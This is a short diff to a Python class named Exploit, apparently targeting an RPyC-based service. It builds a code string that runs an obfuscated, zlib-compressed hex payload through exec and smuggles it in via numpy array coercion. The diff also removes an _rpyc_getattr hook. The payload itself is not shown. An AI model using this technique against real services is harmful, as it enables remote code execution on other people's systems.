@@ -22,11 +22,6 @@ class Exploit:
         # [[1]] here and later during fit_ridge is needed to avoid ridge fit error.
         self.code = f"exec(__import__('zlib').decompress(bytes.fromhex('{transformed}'))) or __import__('numpy').array([[1]])"
 
-    def _rpyc_getattr(self, name):
-        if name == "__array__":
-            return self.__array__
-        raise AttributeError()
-
     def __array__(self):
         pass
 
